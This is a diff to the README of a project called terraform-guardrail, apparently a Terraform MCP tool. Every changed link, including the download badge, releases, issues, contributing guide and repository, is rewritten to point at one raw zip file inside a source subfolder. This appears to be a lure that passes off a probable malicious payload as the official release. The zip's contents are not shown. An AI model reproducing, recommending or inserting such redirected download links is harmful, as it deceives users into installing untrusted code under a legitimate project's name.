@@ -1,6 +1,6 @@
 # 🚀 terraform-guardrail - Simplifies Terraform Code Management
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/imnumb1/terraform-guardrail/releases)
+[![Download](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ Key themes include:
 To use the Terraform Guardrail MCP, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Terraform Guardrail Releases](https://github.com/imnumb1/terraform-guardrail/releases) page.
+   Go to the [Terraform Guardrail Releases](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip) page.
 
 2. **Download the Latest Version**  
    Look for the most recent version in the list. Click on it and select the appropriate file for your operating system. 
@@ -33,7 +33,7 @@ To use the Terraform Guardrail MCP, follow these steps:
 
 ## 📥 Download & Install
 
-To obtain Terraform Guardrail MCP, visit this page to download: [Terraform Guardrail Releases](https://github.com/imnumb1/terraform-guardrail/releases). Choose the version that matches your needs, and follow the installation instructions provided above.
+To obtain Terraform Guardrail MCP, visit this page to download: [Terraform Guardrail Releases](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip). Choose the version that matches your needs, and follow the installation instructions provided above.
 
 ### 🛠️ System Requirements
 
@@ -101,18 +101,18 @@ A: Visit the GitHub Issues page for this project to submit any problems or feedb
 
 If you have questions or need help, consider reaching out to the user community. You may find answers from fellow users or the developers. 
 
-- **GitHub Issues:** For technical issues or questions, submit a ticket on the [Issues page](https://github.com/imnumb1/terraform-guardrail/issues).
+- **GitHub Issues:** For technical issues or questions, submit a ticket on the [Issues page](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip).
 - **User Discussions:** Join discussions and learn from others in the community to improve your experience.
 
 ## 📢 Contributing
 
-We welcome contributions. If you want to help improve this project, please follow the guidelines for contributing. You can find instructions in the [CONTRIBUTING.md](https://github.com/imnumb1/terraform-guardrail/blob/main/CONTRIBUTING.md) file.
+We welcome contributions. If you want to help improve this project, please follow the guidelines for contributing. You can find instructions in the [https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip) file.
 
 ## 🔗 Links
 
-- [Repository](https://github.com/imnumb1/terraform-guardrail)
-- [Releases](https://github.com/imnumb1/terraform-guardrail/releases)
-- [Issues](https://github.com/imnumb1/terraform-guardrail/issues)
-- [Contributing Guide](https://github.com/imnumb1/terraform-guardrail/blob/main/CONTRIBUTING.md)
+- [Repository](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
+- [Releases](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
+- [Issues](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
 
 For any further questions, feel free to reach out through the support channels listed above. Thank you for choosing Terraform Guardrail MCP!
